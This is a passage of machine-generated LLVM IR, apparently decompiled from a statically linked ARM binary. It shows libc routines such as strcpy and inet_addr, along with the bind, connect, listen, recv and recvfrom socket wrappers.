  store i8 %v1_11260, i8* %v3_11260, align 1
  %v4_11260 = load i32, i32* %r3.global-to-local, align 4
  %v5_11260 = add i32 %v4_11260, 1
  store i32 %v5_11260, i32* %r3.global-to-local, align 4
  %v0_11264 = load i32, i32* @r1, align 4
  %v1_11264 = trunc i32 %v0_11264 to i8
  %v3_11264 = inttoptr i32 %v5_11260 to i8*
  store i8 %v1_11264, i8* %v3_11264, align 1
  %v4_11264 = load i32, i32* %r3.global-to-local, align 4
  %v5_11264 = add i32 %v4_11264, 1
  store i32 %v5_11264, i32* %r3.global-to-local, align 4
  %v0_11268 = load i32, i32* @r1, align 4
  %v1_11268 = trunc i32 %v0_11268 to i8
  %v3_11268 = inttoptr i32 %v5_11264 to i8*
  store i8 %v1_11268, i8* %v3_11268, align 1
  %v4_11268 = load i32, i32* %r3.global-to-local, align 4
  %v5_11268 = add i32 %v4_11268, 1
  store i32 %v5_11268, i32* %r3.global-to-local, align 4
  %v0_1126c = load i32, i32* @r1, align 4
  %v1_1126c = trunc i32 %v0_1126c to i8
  %v3_1126c = inttoptr i32 %v5_11268 to i8*
  store i8 %v1_1126c, i8* %v3_1126c, align 1
  %v4_1126c = load i32, i32* %r3.global-to-local, align 4
  %v5_1126c = add i32 %v4_1126c, 1
  store i32 %v5_1126c, i32* %r3.global-to-local, align 4
  %v0_11270 = load i32, i32* @r1, align 4
  %v1_11270 = trunc i32 %v0_11270 to i8
  %v3_11270 = inttoptr i32 %v5_1126c to i8*
  store i8 %v1_11270, i8* %v3_11270, align 1
  %v4_11270 = load i32, i32* %r3.global-to-local, align 4
  %v5_11270 = add i32 %v4_11270, 1
  store i32 %v5_11270, i32* %r3.global-to-local, align 4
  %v0_11274 = load i32, i32* @r1, align 4
  %v1_11274 = trunc i32 %v0_11274 to i8
  %v3_11274 = inttoptr i32 %v5_11270 to i8*
  store i8 %v1_11274, i8* %v3_11274, align 1
  %v4_11274 = load i32, i32* %r3.global-to-local, align 4
  %v5_11274 = add i32 %v4_11274, 1
  store i32 %v5_11274, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11210, { 1, 0 }
  uselistorder i32 %v12_1123c, { 1, 2, 0 }
  uselistorder i32 %v0_1121054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11208.pr, { 0, 2, 1 }
  uselistorder i32 %v6_111f8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_111ec, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 12, 13, 11, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 0, 3, 4, 9, 8, 5, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11248, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_11220, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_112901 = load i32, i32* @r1, align 4
  %v1_112902 = inttoptr i32 %v0_112901 to i8*
  %v2_112903 = load i8, i8* %v1_112902, align 1
  %v2_112945 = icmp eq i8 %v2_112903, 0
  store i1 %v2_112945, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_112903, i8* %arg1, align 1
  br i1 %v2_112945, label %dec_label_pc_112a0, label %dec_label_pc_11288

dec_label_pc_11288:                               ; preds = %entry, %dec_label_pc_11288
  %v0_11288 = load i32, i32* @r1, align 4
  %v1_11288 = add i32 %v0_11288, 1
  store i32 %v1_11288, i32* @r1, align 4
  %v0_1128c = load i32, i32* %r2.global-to-local, align 4
  %v1_1128c = add i32 %v0_1128c, 1
  store i32 %v1_1128c, i32* %r2.global-to-local, align 4
  %v1_11290 = inttoptr i32 %v1_11288 to i8*
  %v2_11290 = load i8, i8* %v1_11290, align 1
  %v2_11294 = icmp eq i8 %v2_11290, 0
  store i1 %v2_11294, i1* %cpsr_z.global-to-local, align 1
  %v3_11298 = inttoptr i32 %v1_1128c to i8*
  store i8 %v2_11290, i8* %v3_11298, align 1
  %v0_1129c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1129c, label %dec_label_pc_112a0, label %dec_label_pc_11288

dec_label_pc_112a0:                               ; preds = %dec_label_pc_11288, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11288, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_112ac = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_112ac, i32* @r1, align 4
  %v0_112b0 = call i32 @inet_aton()
  %v2_112b4 = icmp eq i32 %v0_112b0, 0
  %v4_112b8 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_112b4, i32 -1, i32 %v4_112b8
  ret i32 %storemerge
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_112cc = load i32, i32* @r7, align 4
  store i32 %v3_112cc, i32* %stack_var_-8, align 4
  %v0_112d8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_112d8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_112d8, -4095
  br i1 %tmp, label %dec_label_pc_11300, label %dec_label_pc_112e8

dec_label_pc_112e8:                               ; preds = %entry
  %v0_112ec = call i32 @__aeabi_read_tp()
  %v3_112f0 = load i16, i16* @global_var_216ec.303, align 2
  %v4_112f0 = sext i16 %v3_112f0 to i32
  %v0_112f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_112f4 = sub i32 0, %v0_112f4
  store i32 %v1_112f4, i32* %r2.global-to-local, align 4
  %v3_112f8 = add i32 %v4_112f0, %v0_112ec
  %v4_112f8 = inttoptr i32 %v3_112f8 to i32*
  store i32 %v1_112f4, i32* %v4_112f8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11300.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11300

dec_label_pc_11300:                               ; preds = %entry, %dec_label_pc_112e8
  %v1_11304 = phi i32 [ %v0_112d8, %entry ], [ -1, %dec_label_pc_112e8 ]
  %v2_11300 = phi i32 [ %v3_112cc, %entry ], [ %v2_11300.pre, %dec_label_pc_112e8 ]
  store i32 %v2_11300, i32* @r7, align 4
  ret i32 %v1_11304

; uselistorder directives
  uselistorder i32 %v0_112d8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11300, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_11308:
  %v0_11308 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11308, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11308
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_11308 = load i32, i32* @sl, align 4
  %v8_11308 = shl i32 %v2_11308, %tmp
  %v9_11308 = and i32 %v8_11308, %arg1
  store i32 %v9_11308, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11308, %bb
  %v8_1130c = phi i32 [ %arg1, %dec_label_pc_11308 ], [ %v9_11308, %bb ]
  ret i32 %v8_1130c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11310 = load i32, i32* @r7, align 4
  store i32 %v3_11310, i32* %stack_var_-8, align 4
  %v0_1131c = load i32, i32* @r0, align 4
  store i32 %v0_1131c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1131c, -4095
  br i1 %tmp, label %dec_label_pc_11344, label %dec_label_pc_1132c

dec_label_pc_1132c:                               ; preds = %entry
  %v0_11330 = call i32 @__aeabi_read_tp()
  %v3_11334 = load i16, i16* @global_var_216ec.303, align 2
  %v4_11334 = sext i16 %v3_11334 to i32
  store i32 %v4_11334, i32* @r3, align 4
  %v0_11338 = load i32, i32* %r2.global-to-local, align 4
  %v1_11338 = sub i32 0, %v0_11338
  store i32 %v1_11338, i32* %r2.global-to-local, align 4
  %v3_1133c = add i32 %v4_11334, %v0_11330
  %v4_1133c = inttoptr i32 %v3_1133c to i32*
  store i32 %v1_11338, i32* %v4_1133c, align 4
  %v2_11344.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11344

dec_label_pc_11344:                               ; preds = %entry, %dec_label_pc_1132c
  %v1_11348 = phi i32 [ %v0_1131c, %entry ], [ -1, %dec_label_pc_1132c ]
  %v2_11344 = phi i32 [ %v3_11310, %entry ], [ %v2_11344.pre, %dec_label_pc_1132c ]
  store i32 %v2_11344, i32* @r7, align 4
  ret i32 %v1_11348

; uselistorder directives
  uselistorder i32 %v0_1131c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11344, { 1, 0 }
}

define i32 @"$d.6"(i16 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1134c:
  %r0.global-to-local = alloca i32, align 4
  %tmp = sext i16 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1134c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1134c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1134c
  %tmp2 = inttoptr i32 %arg2 to i16*
  %v2_1134c = load i32, i32* @fp, align 4
  %v9_1134c = shl i32 %v2_1134c, %arg2
  %v10_1134c = and i32 %v9_1134c, %tmp
  store i32 %v10_1134c, i32* %r0.global-to-local, align 4
  %v2_11350 = trunc i32 %v10_1134c to i16
  store i16 %v2_11350, i16* %tmp2, align 2
  %v6_11350 = load i32, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1134c, %bb
  %v10_11350 = phi i32 [ %tmp, %dec_label_pc_1134c ], [ %v6_11350, %bb ]
  ret i32 %v10_11350

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11358 = load i32, i32* @r4, align 4
  store i32 %v3_11358, i32* %stack_var_-20, align 4
  %v6_11358 = load i32, i32* @r5, align 4
  %v9_11358 = load i32, i32* @r6, align 4
  %v12_11358 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r3, align 4
  %v4_11364 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 12776) to i32*), align 4
  store i32 %v4_11364, i32* @ip, align 4
  %v2_11368 = icmp eq i32 %v4_11364, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_11368, label %dec_label_pc_11380, label %entry.dec_label_pc_1138c_crit_edge

entry.dec_label_pc_1138c_crit_edge:               ; preds = %entry
  br label %dec_label_pc_1138c

dec_label_pc_11380:                               ; preds = %entry
  store i32 %v3_11358, i32* @r4, align 4
  store i32 %v9_11358, i32* @r6, align 4
  store i32 %v12_11358, i32* @r7, align 4
  %v0_11388 = call i32 @__sys_connect()
  br label %dec_label_pc_1138c

dec_label_pc_1138c:                               ; preds = %entry.dec_label_pc_1138c_crit_edge, %dec_label_pc_11380
  %v0_1138c = call i32 @__libc_enable_asynccancel()
  %v0_11390 = load i32, i32* @r6, align 4
  store i32 %v0_11390, i32* @r1, align 4
  store i32 %v0_1138c, i32* @r5, align 4
  %v0_1139c = load i32, i32* @r4, align 4
  store i32 %v0_1139c, i32* @r0, align 4
  %v0_113a0 = call i32 @__sys_connect()
  store i32 %v0_113a0, i32* @r4, align 4
  %v0_113a8 = load i32, i32* @r5, align 4
  %v1_113ac = call i32 @__libc_disable_asynccancel(i32 %v0_113a8)
  %v0_113b0 = load i32, i32* @r4, align 4
  %v2_113b8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_113b8, i32* @r4, align 4
  store i32 %v6_11358, i32* @r5, align 4
  store i32 %v9_11358, i32* @r6, align 4
  store i32 %v12_11358, i32* @r7, align 4
  ret i32 %v0_113b0

; uselistorder directives
  uselistorder label %dec_label_pc_1138c, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_113c8 = load i32, i32* @r7, align 4
  store i32 %v3_113c8, i32* %stack_var_-8, align 4
  %v0_113d4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_113d4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_113d4, -4095
  br i1 %tmp, label %dec_label_pc_113fc, label %dec_label_pc_113e4

dec_label_pc_113e4:                               ; preds = %entry
  %v0_113e8 = call i32 @__aeabi_read_tp()
  %v3_113ec = load i16, i16* @global_var_216ec.303, align 2
  %v4_113ec = sext i16 %v3_113ec to i32
  %v0_113f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_113f0 = sub i32 0, %v0_113f0
  store i32 %v1_113f0, i32* %r2.global-to-local, align 4
  %v3_113f4 = add i32 %v4_113ec, %v0_113e8
  %v4_113f4 = inttoptr i32 %v3_113f4 to i32*
  store i32 %v1_113f0, i32* %v4_113f4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_113fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_113fc

dec_label_pc_113fc:                               ; preds = %entry, %dec_label_pc_113e4
  %v1_11400 = phi i32 [ %v0_113d4, %entry ], [ -1, %dec_label_pc_113e4 ]
  %v2_113fc = phi i32 [ %v3_113c8, %entry ], [ %v2_113fc.pre, %dec_label_pc_113e4 ]
  store i32 %v2_113fc, i32* @r7, align 4
  ret i32 %v1_11400

; uselistorder directives
  uselistorder i32 %v0_113d4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_113fc, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_11404:
  %v0_11404 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11404, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11404
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_11404 = load i32, i32* @lr, align 4
  %v8_11404 = shl i32 %v2_11404, %tmp
  %v9_11404 = and i32 %v8_11404, %arg1
  store i32 %v9_11404, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11404, %bb
  %v8_11408 = phi i32 [ %arg1, %dec_label_pc_11404 ], [ %v9_11404, %bb ]
  ret i32 %v8_11408

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1140c = load i32, i32* @r4, align 4
  store i32 %v3_1140c, i32* %stack_var_-12, align 4
  %v0_1141c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1141c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1141c, -4095
  br i1 %tmp, label %dec_label_pc_11444, label %dec_label_pc_1142c

dec_label_pc_1142c:                               ; preds = %entry
  %v0_11430 = call i32 @__aeabi_read_tp()
  %v3_11434 = load i16, i16* @global_var_216ec.303, align 2
  %v4_11434 = sext i16 %v3_11434 to i32
  %v0_11438 = load i32, i32* %r2.global-to-local, align 4
  %v1_11438 = sub i32 0, %v0_11438
  store i32 %v1_11438, i32* %r2.global-to-local, align 4
  %v3_1143c = add i32 %v4_11434, %v0_11430
  %v4_1143c = inttoptr i32 %v3_1143c to i32*
  store i32 %v1_11438, i32* %v4_1143c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11444.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11444

dec_label_pc_11444:                               ; preds = %entry, %dec_label_pc_1142c
  %v1_11448 = phi i32 [ %v0_1141c, %entry ], [ -1, %dec_label_pc_1142c ]
  %v2_11444 = phi i32 [ %v3_1140c, %entry ], [ %v2_11444.pre, %dec_label_pc_1142c ]
  store i32 %v2_11444, i32* @r4, align 4
  ret i32 %v1_11448

; uselistorder directives
  uselistorder i32 %v0_1141c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11444, { 1, 0 }
}

define i32 @"$d.4"(i16 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1144c:
  %r0.global-to-local = alloca i32, align 4
  %tmp = sext i16 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1144c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1144c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1144c
  %tmp2 = inttoptr i32 %arg2 to i16*
  %v2_1144c = load i32, i32* @r7, align 4
  %v5_1144c = udiv i32 %v2_1144c, 4
  %v6_1144c = and i32 %v5_1144c, %tmp
  store i32 %v6_1144c, i32* %r0.global-to-local, align 4
  %v2_11450 = trunc i32 %v6_1144c to i16
  store i16 %v2_11450, i16* %tmp2, align 2
  %v6_11450 = load i32, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1144c, %bb
  %v10_11450 = phi i32 [ %tmp, %dec_label_pc_1144c ], [ %v6_11450, %bb ]
  ret i32 %v10_11450

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11454 = load i32, i32* @r7, align 4
  store i32 %v3_11454, i32* %stack_var_-8, align 4
  %v0_11460 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11460, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11460, -4095
  br i1 %tmp, label %dec_label_pc_11488, label %dec_label_pc_11470

dec_label_pc_11470:                               ; preds = %entry
  %v0_11474 = call i32 @__aeabi_read_tp()
  %v3_11478 = load i16, i16* @global_var_216ec.303, align 2
  %v4_11478 = sext i16 %v3_11478 to i32
  %v0_1147c = load i32, i32* %r2.global-to-local, align 4
  %v1_1147c = sub i32 0, %v0_1147c
  store i32 %v1_1147c, i32* %r2.global-to-local, align 4
  %v3_11480 = add i32 %v4_11478, %v0_11474
  %v4_11480 = inttoptr i32 %v3_11480 to i32*
  store i32 %v1_1147c, i32* %v4_11480, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11488.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11488

dec_label_pc_11488:                               ; preds = %entry, %dec_label_pc_11470
  %v1_1148c = phi i32 [ %v0_11460, %entry ], [ -1, %dec_label_pc_11470 ]
  %v2_11488 = phi i32 [ %v3_11454, %entry ], [ %v2_11488.pre, %dec_label_pc_11470 ]
  store i32 %v2_11488, i32* @r7, align 4
  ret i32 %v1_1148c

; uselistorder directives
  uselistorder i32 %v0_11460, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11488, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11494 = load i32, i32* @r7, align 4
  store i32 %v3_11494, i32* %stack_var_-8, align 4
  %v0_114a0 = load i32, i32* @r0, align 4
  store i32 %v0_114a0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_114a0, -4095
  br i1 %tmp, label %dec_label_pc_114c8, label %dec_label_pc_114b0

dec_label_pc_114b0:                               ; preds = %entry
  %v0_114b4 = call i32 @__aeabi_read_tp()
  %v3_114b8 = load i16, i16* @global_var_216ec.303, align 2
  %v4_114b8 = sext i16 %v3_114b8 to i32
  %v0_114bc = load i32, i32* %r2.global-to-local, align 4
  %v1_114bc = sub i32 0, %v0_114bc
  store i32 %v1_114bc, i32* %r2.global-to-local, align 4
  %v3_114c0 = add i32 %v4_114b8, %v0_114b4
  %v4_114c0 = inttoptr i32 %v3_114c0 to i32*
  store i32 %v1_114bc, i32* %v4_114c0, align 4
  %v2_114c8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_114c8

dec_label_pc_114c8:                               ; preds = %entry, %dec_label_pc_114b0
  %v1_114cc = phi i32 [ %v0_114a0, %entry ], [ -1, %dec_label_pc_114b0 ]
  %v2_114c8 = phi i32 [ %v3_11494, %entry ], [ %v2_114c8.pre, %dec_label_pc_114b0 ]
  store i32 %v2_114c8, i32* @r7, align 4
  ret i32 %v1_114cc

; uselistorder directives
  uselistorder i32 %v0_114a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_114c8, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_114d0:
  %v0_114d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_114d0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_114d0
  %v2_114d4 = load i32, i32* @ip, align 4
  %v5_114d4 = udiv i32 %v2_114d4, 16
  %v6_114d4 = and i32 %v5_114d4, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_114d0, %bb
  %v7_114d4 = phi i32 [ %arg1, %dec_label_pc_114d0 ], [ %v6_114d4, %bb ]
  ret i32 %v7_114d4

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_114dc = load i32, i32* @r4, align 4
  store i32 %v3_114dc, i32* %stack_var_-24, align 4
  %v6_114dc = load i32, i32* @r5, align 4
  %v9_114dc = load i32, i32* @r6, align 4
  %v12_114dc = load i32, i32* @r7, align 4
  %v15_114dc = load i32, i32* @r8, align 4
  %v18_114dc = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @ip, align 4
  %v4_114e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 12776) to i32*), align 4
  %v2_114ec = icmp eq i32 %v4_114e8, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_114ec, label %dec_label_pc_11504, label %entry.dec_label_pc_1150c_crit_edge

entry.dec_label_pc_1150c_crit_edge:               ; preds = %entry
  br label %dec_label_pc_1150c

dec_label_pc_11504:                               ; preds = %entry
  store i32 %v3_114dc, i32* @r4, align 4
  store i32 %v9_114dc, i32* @r6, align 4
  store i32 %v12_114dc, i32* @r7, align 4
  store i32 %v15_114dc, i32* @r8, align 4
  %v0_11508 = call i32 @__sys_recv()
  br label %dec_label_pc_1150c

dec_label_pc_1150c:                               ; preds = %entry.dec_label_pc_1150c_crit_edge, %dec_label_pc_11504
  %v0_1150c = call i32 @__libc_enable_asynccancel()
  %v0_11510 = load i32, i32* @r6, align 4
  store i32 %v0_11510, i32* @r1, align 4
  store i32 %v0_1150c, i32* @r5, align 4
  %v0_11520 = load i32, i32* @r4, align 4
  store i32 %v0_11520, i32* @r0, align 4
  %v0_11524 = call i32 @__sys_recv()
  store i32 %v0_11524, i32* @r4, align 4
  %v0_1152c = load i32, i32* @r5, align 4
  %v1_11530 = call i32 @__libc_disable_asynccancel(i32 %v0_1152c)
  %v0_11534 = load i32, i32* @r4, align 4
  %v2_11538 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11538, i32* @r4, align 4
  store i32 %v6_114dc, i32* @r5, align 4
  store i32 %v9_114dc, i32* @r6, align 4
  store i32 %v12_114dc, i32* @r7, align 4
  store i32 %v15_114dc, i32* @r8, align 4
  store i32 %v18_114dc, i32* @lr, align 4
  ret i32 %v0_11534

; uselistorder directives
  uselistorder label %dec_label_pc_1150c, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11548 = load i32, i32* @r4, align 4
  store i32 %v3_11548, i32* %stack_var_-16, align 4
  %v0_1155c = load i32, i32* @r0, align 4
  store i32 %v0_1155c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1155c, -4095
  br i1 %tmp, label %dec_label_pc_11584, label %dec_label_pc_1156c

dec_label_pc_1156c:                               ; preds = %entry
  %v0_11570 = call i32 @__aeabi_read_tp()
  %v3_11574 = load i16, i16* @global_var_216ec.303, align 2
  %v4_11574 = sext i16 %v3_11574 to i32
  %v0_11578 = load i32, i32* %r2.global-to-local, align 4
  %v1_11578 = sub i32 0, %v0_11578
  store i32 %v1_11578, i32* %r2.global-to-local, align 4
  %v3_1157c = add i32 %v4_11574, %v0_11570
  %v4_1157c = inttoptr i32 %v3_1157c to i32*
  store i32 %v1_11578, i32* %v4_1157c, align 4
  %v2_11584.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11584

dec_label_pc_11584:                               ; preds = %entry, %dec_label_pc_1156c
  %v1_11588 = phi i32 [ %v0_1155c, %entry ], [ -1, %dec_label_pc_1156c ]
  %v2_11584 = phi i32 [ %v3_11548, %entry ], [ %v2_11584.pre, %dec_label_pc_1156c ]
  store i32 %v2_11584, i32* @r4, align 4
  ret i32 %v1_11588

; uselistorder directives
  uselistorder i32 %v0_1155c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11584, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11590 = load i32, i32* @r4, align 4
  store i32 %v3_11590, i32* %stack_var_-32, align 4
  %v6_11590 = load i32, i32* @r5, align 4
  %v9_11590 = load i32, i32* @r6, align 4
  %v12_11590 = load i32, i32* @r7, align 4
  %v15_11590 = load i32, i32* @r8, align 4
  %v18_11590 = load i32, i32* @sb, align 4
  %v21_11590 = load i32, i32* @sl, align 4
  %v24_11590 = load i32, i32* @lr, align 4
  %v4_115a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 12776) to i32*), align 4
  %v2_115a8 = icmp eq i32 %v4_115a0, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_115a8, label %dec_label_pc_115c8, label %dec_label_pc_115d4

dec_label_pc_115c8:                               ; preds = %entry
  store i32 %v3_11590, i32* @r4, align 4
  store i32 %v12_11590, i32* @r7, align 4
  store i32 %v15_11590, i32* @r8, align 4
  store i32 %v18_11590, i32* %sb.global-to-local, align 4
  %v0_115d0 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_115d4

dec_label_pc_115d4:                               ; preds = %entry, %dec_label_pc_115c8
  %v0_115d4 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_115d4, i32* @r5, align 4
  %v0_115e8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_115e8, i32* @r0, align 4
  %v0_115f0 = call i32 @__sys_recvfrom()
  store i32 %v0_115f0, i32* @r4, align 4
  %v0_115f8 = load i32, i32* @r5, align 4
  %v1_115fc = call i32 @__libc_disable_asynccancel(i32 %v0_115f8)
  %v0_11600 = load i32, i32* @r4, align 4
  %v2_11608 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11608, i32* @r4, align 4
  store i32 %v6_11590, i32* @r5, align 4
  store i32 %v9_11590, i32* @r6, align 4
  store i32 %v12_11590, i32* @r7, align 4
  store i32 %v15_11590, i32* @r8, align 4
  store i32 %v18_11590, i32* @sb, align 4
